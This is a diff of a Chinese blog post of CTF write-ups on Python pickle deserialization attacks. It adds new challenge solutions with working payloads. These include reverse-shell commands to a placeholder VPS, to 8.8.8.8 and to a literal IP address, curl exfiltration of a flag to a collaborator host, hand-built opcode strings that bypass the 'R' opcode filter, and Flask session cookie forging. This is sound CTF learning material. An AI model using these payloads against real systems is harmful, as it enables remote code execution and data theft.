+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数&lt;code>eval()&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 用pker.py生成payload&lt;/span>
+&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;notadmin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>
+&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
+&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
+&lt;span style="color:#111">door&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;backdoor&amp;#34;&lt;/span>&lt;span style="color:#111">,[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;subprocess&amp;#39;).call(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">echo -e &amp;#39;#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,shell=True)&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后&lt;code>base64.b64encode(data)&lt;/code>加进&lt;code>session['info']&lt;/code>中拿到shell&lt;/p>
+&lt;p>看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-&amp;gt;&lt;a href="https://juejin.cn/post/6994717395298287624">wp1&lt;/a> | &lt;a href="https://ctf.njupt.edu.cn/663.html#what_pickle">wp2&lt;/a>&lt;/p>
+&lt;/details>
 &lt;h3 id="--仅可以引入builtins模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>builtins&lt;/code>模块&lt;/h3>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
 &lt;p>更多知识参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | [Python 的内建对象](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/p>
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
-栗子3 - [Code-Breaking 2018] picklecode
+栗子4 - [Code-Breaking 2018] picklecode
 &lt;/h4>
 &lt;/summary>
 &lt;p>本地复现还是失败，docker地址-&amp;gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了&lt;/p>
@@ -2332,7 +2487,7 @@ df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
-栗子4 - [BalsnCTF 2019] Pyshv1
+栗子5 - [BalsnCTF 2019] Pyshv1
 &lt;/h4>
 &lt;/summary>
 &lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1&lt;/p>
@@ -2360,7 +2515,7 @@ return
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
-栗子5 - [BalsnCTF 2019] Pyshv2
+栗子6 - [BalsnCTF 2019] Pyshv2
 &lt;/h4>
 &lt;/summary>
 &lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2&lt;/p>
@@ -2392,7 +2547,7 @@ return
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
-[高校战“疫”网络安全分享赛2020] webtmp
+栗子7 - [高校战“疫”网络安全分享赛2020] webtmp
 &lt;/h4>
 &lt;/summary>
 &lt;p>（这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了&lt;code>R&lt;/code>操作码，同时重写&lt;code>find_class()&lt;/code>限制引入模块为&lt;code>__main__&lt;/code>，两个考点）&lt;/p>
@@ -2576,7 +2731,53 @@ return
 &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
 &lt;span style="color:#d88200">&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((&amp;#34;8.8.8.8&amp;#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
 &lt;span style="color:#111">])&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="--使用_getattributeload_objload_inst实现任意文件读取">&amp;ndash;&amp;raquo;使用&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>实现任意文件读取&lt;/h3>
+&lt;/code>&lt;/pre>&lt;/div>&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+栗子8 - [巅峰极客 2021]opcode
+&lt;/h4>
+&lt;/summary>
+&lt;p>首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png" alt="image-20211024145247073">&lt;/p>
+&lt;p>第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的&lt;code>session['data']&lt;/code>处&lt;/p>
+&lt;p>但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法&lt;u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写&lt;code>pickle.loads&lt;/code>方法，只是个摆设&lt;/u>，相当于仅对R操作码进行了限制，笑嘻了&lt;/p>
+&lt;p>直接上&lt;code>eval()&lt;/code>+&lt;code>b'o'&lt;/code>来弹shell了，不多bb&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
+&lt;span style="color:#111">eval&lt;/span>
+&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/101.35.113.107/8426 0&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
+&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者是用&lt;code>system()&lt;/code>+&lt;code>curl&lt;/code>+&lt;code>b'o'&lt;/code>外带flag&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cos&lt;/span>
+&lt;span style="color:#111">system&lt;/span>
+&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl burp_collaborator.net/?flag=`app/readflag`&amp;#39;&lt;/span>
+&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后生成b64的内容（用&lt;code>'''&lt;/code>的好处是不用考虑太多引号转义的问题&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
+&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;xxxxxxxxxxxxxx&amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookie的生成就是flask_session_cookie_manager一把梭了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;y0u-wi11_neuer_kn0vv-!@#se%32&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#39;{&amp;#34;data&amp;#34;: &amp;#34;xxxxb64_contentxxxx&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;adminadmin&amp;#34;}&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>————如果按照题目原有的意思，限制&lt;code>builtins&lt;/code>+&lt;code>b'R'&lt;/code>操作码也是很好做出来的&lt;/p>
+&lt;p>先用pker生成带R的opcode&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span>
+&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后手搓，在调用callable前添加MARK即&lt;code>(&lt;/code>，去掉&lt;code>t&lt;/code>和调用&lt;code>t&lt;/code>用到的MARK&lt;/p>
+&lt;p>也就是&lt;code>[callable] [tuple] R===&amp;gt;MARK [callable] [args...] o&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__(&amp;quot;os&amp;quot;).system(&amp;quot;whoami&amp;quot;)'\no.'''
+&lt;/code>&lt;/pre>&lt;p>可以看下区别&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png" alt="image-20211024165337816">&lt;/p>
+&lt;p>修改都是一对一对的，&lt;strong>总结一下方法就是&lt;code>0gx&lt;/code>要变为&lt;code>0(gx&lt;/code>，&lt;code>(gx&lt;/code>要变为&lt;code>gx&lt;/code> ，&lt;code>tR&lt;/code>换成&lt;code>o&lt;/code>&lt;/strong>&lt;/p>
+&lt;p>参考：&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6">wp&lt;/a>&lt;/p>
+&lt;/details>
+&lt;h3 id="--使用_getattributeload_objload_inst实现任意文件读取">&amp;ndash;&amp;raquo;使用&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>实现任意文件读取&lt;/h3>
 &lt;ul>
 &lt;li>
 &lt;p>&lt;code>find_class()&lt;/code>&lt;/p>
@@ -2731,7 +2932,7 @@ return
 &lt;details>
 &lt;summary>
 &lt;h4 class="inline">
-栗子7 - [BalsnCTF 2019] Pyshv3
+栗子9 - [BalsnCTF 2019] Pyshv3
 &lt;/h4>
 &lt;/summary>
 &lt;p>这次的find_class()没有变化，但是structs有具体的实现&lt;/p>
